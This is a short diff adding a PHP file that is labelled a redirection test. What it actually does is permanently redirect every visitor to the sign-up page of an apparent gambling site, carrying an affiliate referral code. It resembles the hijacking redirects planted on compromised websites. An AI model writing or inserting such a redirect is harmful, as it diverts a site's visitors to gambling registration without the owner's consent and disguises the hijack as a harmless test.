@@ -1,0 +1,5 @@
+    <?php
+    // PHP permanent URL redirection test
+    header("Location: https://storybet138.com/daftar?ref=AGADA254414", true, 301);
+    exit();
+    ?>
